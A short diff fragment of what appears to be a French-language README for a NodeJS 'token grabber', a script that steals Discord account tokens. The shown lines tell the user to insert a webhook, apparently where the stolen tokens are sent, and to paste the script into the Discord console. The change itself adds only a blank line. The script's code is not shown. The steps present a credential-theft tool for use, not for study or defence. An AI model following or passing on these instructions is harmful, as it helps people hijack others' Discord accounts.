@@ -2,6 +2,7 @@
 Script Token Grabber en NodeJS
 
 1). Complete le script avec un webhook
+
 2). Entrer le script dans la console de discord
 
 ```
